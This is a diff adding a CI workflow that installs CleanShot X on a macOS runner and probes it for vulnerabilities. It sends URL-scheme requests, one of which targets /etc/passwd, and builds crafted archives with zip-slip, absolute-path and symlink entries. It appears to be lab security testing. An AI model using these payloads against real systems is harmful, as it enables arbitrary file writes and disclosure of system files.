@@ -1,0 +1,86 @@
+name: csx-lab
+on:
+  push:
+    branches: [lab]
+jobs:
+  lab:
+    runs-on: macos-14
+    timeout-minutes: 25
+    steps:
+      - name: Env
+        run: |
+          sw_vers
+          uname -m
+      - name: Download and install CleanShot X
+        run: |
+          set -x
+          curl -sL --max-time 300 -o /tmp/csx.dmg https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
+          ls -l /tmp/csx.dmg
+          shasum -a 256 /tmp/csx.dmg
+          hdiutil attach /tmp/csx.dmg -nobrowse -quiet
+          ls /Volumes
+          cp -R "/Volumes/CleanShot X/CleanShot X.app" /Applications/
+          hdiutil detach "/Volumes/CleanShot X" -quiet || true
+          ls -la "/Applications/CleanShot X.app/Contents/MacOS/"
+      - name: Inspect signature and entitlements
+        run: |
+          APP="/Applications/CleanShot X.app"
+          codesign -dv --verbose=4 "$APP" 2>&1 | head -40
+          echo "=== entitlements ==="
+          codesign -d --entitlements :- "$APP" 2>&1 | head -80
+          echo "=== spctl ==="
+          spctl -a -vv "$APP" 2>&1 | head -10
+          echo "=== launchservices ==="
+          /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump 2>/dev/null | grep -A5 -i "cleanshot" | head -40
+      - name: Run app and URL scheme probes
+        run: |
+          set -x
+          open -a "CleanShot X" || true
+          sleep 8
+          pgrep -lf CleanShot || echo "not running"
+          for u in "cleanshot://" "cleanshot://capture" "cleanshot://capture?mode=area" "cleanshot://upload" "cleanshot://open?path=/etc/passwd" "cleanshot://settings"; do
+            echo "--- $u"
+            open "$u" 2>&1 || true
+            sleep 2
+          done
+          sleep 3
+          echo "=== process ==="
+          pgrep -lf CleanShot || true
+          echo "=== log ==="
+          log show --last 5m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -120 || true
+          echo "=== crash reports ==="
+          ls -la ~/Library/Logs/DiagnosticReports 2>/dev/null | tail -20 || true
+      - name: Document parser probes
+        run: |
+          set -x
+          python3 - <<'PY'
+          import zipfile, json, os
+          os.makedirs('/tmp/probe', exist_ok=True)
+          # 1. zip slip attempt
+          with zipfile.ZipFile('/tmp/probe/slip.cleanshot','w') as z:
+              z.writestr('../../../../tmp/CSX_PWNED.txt','pwned')
+              z.writestr('manifest.json', json.dumps({"version":1}))
+          # 2. absolute path entry
+          with zipfile.ZipFile('/tmp/probe/abs.cleanshot','w') as z:
+              z.writestr('/tmp/CSX_PWNED_ABS.txt','pwned')
+              z.writestr('manifest.json', json.dumps({"version":1}))
+          # 3. symlink entry
+          zi = zipfile.ZipInfo('link')
+          zi.external_attr = (0o120777 << 16)
+          with zipfile.ZipFile('/tmp/probe/symlink.cleanshot','w') as z:
+              z.writestr(zi, '/etc/passwd')
+              z.writestr('manifest.json', json.dumps({"version":1}))
+          print("built")
+          PY
+          for f in /tmp/probe/*.cleanshot; do
+            echo "--- open $f"
+            open -a "CleanShot X" "$f" 2>&1 || true
+            sleep 3
+          done
+          sleep 3
+          echo "=== traversal check ==="
+          ls -la /tmp/CSX_PWNED.txt /tmp/CSX_PWNED_ABS.txt 2>&1 || echo "no traversal artifacts"
+          echo "=== log ==="
+          log show --last 3m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -80 || true
+          echo "=== crash ==="
+          ls -la ~/Library/Logs/DiagnosticReports 2>/dev/null | tail -10 || true
